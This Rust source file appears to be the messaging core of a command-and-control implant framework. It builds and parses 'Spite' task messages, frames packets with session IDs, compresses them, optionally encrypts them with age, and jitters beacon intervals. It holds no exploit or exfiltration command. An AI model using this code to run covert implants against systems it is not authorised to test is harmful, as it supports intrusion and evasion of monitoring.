pub mod proto;
pub mod crypto;
pub mod compress;
pub mod module;
pub mod prelude;

use nanorand::{Rng, WyRand};
use prost::Message;
use anyhow::anyhow;
use std::mem::size_of;
use thiserror::Error;

use crate::compress::decompress;
use crate::proto::implantpb;
use crate::proto::implantpb::{Spite, Spites};
pub use prelude::*;
pub fn get_message_len<M: Message>(message: &M) -> usize {
    message.encoded_len()
}

pub fn new_spite(task_id: u32, name: String, body: Body) -> implantpb::Spite {
    Spite {
        task_id,
        r#async: true,
        timeout: 0,
        name,
        error: 0,
        status: Option::from(implantpb::Status {
            task_id,
            status: 0,
            error: "".to_string(),
        }),
        body: Some(body),
    }
}

pub fn new_empty_spite(task_id: u32, name: String) -> implantpb::Spite {
    Spite {
        task_id,
        r#async: true,
        timeout: 0,
        name,
        error: 0,
        status: Option::from(implantpb::Status {
            task_id,
            status: 0,
            error: "".to_string(),
        }),
        body: Some(Body::Empty(implantpb::Empty::default())),
    }
}
pub fn new_error_spite(task_id: u32, name: String, error: u32) -> implantpb::Spite {
    Spite {
        task_id,
        r#async: true,
        timeout: 0,
        name,
        error,
        status: Option::from(implantpb::Status {
            task_id,
            status: 1,
            error: "".to_string(),
        }),
        body: None,
    }
}

fn get_timeu64() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("Time went backwards")
        .as_secs()
}

pub fn get_sid() -> [u8; 4] {
    let mut rng = WyRand::new_seed(get_timeu64());
    let instance_id: [u8; 4];

    if cfg!(debug_assertions) {
        instance_id = [1, 2, 3, 4];
    } else {
        let mut temp_id = [0u8; 4];
        rng.fill(&mut temp_id);
        instance_id = temp_id;
    }
    instance_id
}


pub fn new_heartbeat(interval: u64, jitter: f64) -> u64 {
    let base_time_ms = (interval * 1000) as f64;
    
    let mut rng = WyRand::new();
    let jitter_factor = if jitter != 0.0 {
        1.0 + (rng.generate_range(0..=((jitter * 2000.0) as u64)) as f64 / 1000.0 - jitter)
    } else {
        1.0
    };

    (base_time_ms * jitter_factor) as u64
}

static TRANSPORT_START: u8 = 0xd1;
static TRANSPORT_END: u8 = 0xd2;
pub static HEADER_LEN: usize = 9;

#[derive(Debug, Error)]
pub enum ParserError {
    #[error(transparent)]
    Panic(#[from] anyhow::Error),

    #[error("No start marker found in data")]
    NoStart,

    #[error("No end marker found in data")]
    NoEnd,

    #[error("Data length is insufficient or incorrect")]
    LengthError,

    // #[error("Failed to decode Spites")]
    // DecodeError(#[from] prost::DecodeError),
    //
    // #[error("Failed to encode Spites")]
    // EncodeError(#[from] prost::EncodeError),

    #[error("I/O Error: {0}")]
    IOError(#[from] std::io::Error),

    #[error("Data body is missing")]
    MissBody,
}

#[cfg_attr(debug_assertions, derive(Debug))]
pub struct SpiteData {
    pub start: u8,
    pub session_id: [u8; 4],
    pub length: u32,
    pub data: Vec<u8>,
    pub end: u8,
}

impl SpiteData {
    pub fn default() -> Self {
        SpiteData {
            start: TRANSPORT_START,
            session_id: [0u8; 4],
            length: 0,
            data: Vec::new(),
            end: TRANSPORT_END,
        }
    }

    pub fn new(session_id: [u8; 4], data: &[u8], recipient_public_key: Option<&str>) -> Self {
        // First compress the data
        let compressed = compress::compress(data).unwrap_or_else(|_| data.to_vec());
        
        // Then encrypt if we have secure feature and non-empty key
        let final_data = {
            #[cfg(feature = "secure")]
            {   
                if let Some(public_key) = recipient_public_key {
                    if !public_key.is_empty() {
                        // Inline age encryption
                        use crate::crypto::age::age_encrypt;
                        age_encrypt(&compressed, public_key).unwrap_or(compressed)
                    } else {
                        compressed
                    }
                } else {
                    compressed
                }
            }
            #[cfg(not(feature = "secure"))]
            {
                compressed
            }
        };
        let length = final_data.len() as u32;
        SpiteData {
            start: TRANSPORT_START,
            session_id,
            length,
            data: final_data,
            end: TRANSPORT_END,
        }
    }

    pub fn header(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        buf.push(self.start);
        buf.extend_from_slice(&self.session_id);
        buf.extend_from_slice(&self.length.to_le_bytes());
        buf
    }

    pub fn body(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        buf.extend_from_slice(&self.data);
        buf.push(self.end);
        buf
    }

    pub fn pack(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        buf.push(self.start);
        buf.extend_from_slice(&self.session_id);
        buf.extend_from_slice(&self.length.to_le_bytes());
        buf.extend_from_slice(&self.data);
        buf.push(self.end);
        buf
    }

    pub fn unpack(&mut self, buf: &[u8]) -> Result<(), ParserError> {
        if buf.len() < size_of::<u32>() + 4 + 2 {
            return Err(ParserError::LengthError);
        }

        if buf[0] != TRANSPORT_START {
            return Err(ParserError::NoStart);
        }
        if buf[buf.len() - 1] != TRANSPORT_END {
            return Err(ParserError::NoEnd);
        }

        let mut pos = 1;
        self.session_id = [buf[pos], buf[pos + 1], buf[pos + 2], buf[pos + 3]];
        pos += 4;
        self.length = u32::from_le_bytes([buf[pos], buf[pos + 1], buf[pos + 2], buf[pos + 3]]);
        pos += size_of::<u32>();
        self.data = buf[pos..pos + self.length as usize].to_vec();
        Ok(())
    }

    pub fn get_data(&self) -> &Vec<u8> {
        &self.data
    }

    pub fn set_data(&mut self, data: Vec<u8>) -> Result<bool, ParserError> {
        if let Some(&last_byte) = data.last() {
            if last_byte != TRANSPORT_END {
                Err(ParserError::NoEnd)
            }else{
                self.data = data[..data.len()-1].to_vec();
                Ok(true)
            }
        } else {
            Err(ParserError::LengthError)
        }
    }

    pub fn parse(&self, private_key: Option<&str>) -> Result<Spites, ParserError> {
        let spite_data = self.get_data();
        if spite_data.is_empty() {
            return Err(ParserError::MissBody);
        }
        // First decrypt if we have secure feature and non-empty key
        let decrypted_data = {
            #[cfg(feature = "secure")]
            {
                if let Some(private_key) = private_key {
                    if !private_key.is_empty() {
                        // Inline age decryption
                        use crate::crypto::age::age_decrypt;
                        age_decrypt(spite_data, private_key).unwrap_or_else(|_| spite_data.to_vec())
                    } else {
                        spite_data.to_vec()
                    }
                } else {
                    spite_data.to_vec()
                }
            }
            #[cfg(not(feature = "secure"))]
            {
                spite_data.to_vec()
            }
        };

        // Then decompress
        let decompressed = decompress(&decrypted_data)?;

        // Finally decode protobuf
        match Spites::decode(&decompressed[..]) {
            Ok(spites) => Ok(spites),
            Err(err) => {
                Err(anyhow!("Failed to decode: {:?}", err).into())
            }
        }
    }
}

/// 将 `Spites` 编码为 `Vec<u8>`
pub fn encode(spites: Spites) -> Result<Vec<u8>, ParserError> {
    let mut buf = Vec::new();
    spites.encode(&mut buf).map_err(|e| anyhow!(e))?;
    Ok(buf)
}

/// 将 `Vec<u8>` 解码为 `Spites`
pub fn decode(data: Vec<u8>) -> Result<Spites, ParserError> {
    let spites = Spites::decode(&data[..]).map_err(|e| anyhow!(e))?;
    Ok(spites)
}

pub fn marshal(id: [u8;4], spites: Spites, recipient_public_key: Option<&str>) -> Result<SpiteData, ParserError> {
    let mut buf = Vec::new();
    spites.encode(&mut buf).map_err(|e| anyhow!(e))?;
    Ok(SpiteData::new(id, &buf, recipient_public_key))
}

pub fn marshal_one(id: [u8;4], spite: Spite, recipient_public_key: Option<&str>) -> Result<SpiteData, ParserError> {
   marshal(id, Spites{spites: vec![spite]}, recipient_public_key)
}

pub fn parser_header(buf: &[u8]) -> Result<SpiteData, ParserError> {
    // 检查是否有足够的字节来解析 header（9 字节）
    if buf.len() < 9 {
        return Err(ParserError::LengthError);
    }

    // 检查起始标记
    if buf[0] != TRANSPORT_START {
        return Err(ParserError::NoStart);
    }

    // 解析 start (1字节)，session_id (4字节)，length (4字节)
    let start = buf[0];

    let session_id = [buf[1], buf[2], buf[3], buf[4]];

    let length = u32::from_le_bytes([buf[5], buf[6], buf[7], buf[8]]);

    // 构造并返回 SpiteData（header部分，data部分留空）
    Ok(SpiteData {
        start,
        session_id,
        length,
        data: Vec::new(), // header 解析不处理 data
        end: TRANSPORT_END, // 默认值，不从 header 中解析
    })
}

/// Generate new Age keypair
#[cfg(feature = "secure")]
pub fn generate_age_keypair() -> (String, String) {
    crate::crypto::age::generate_age_keypair()
}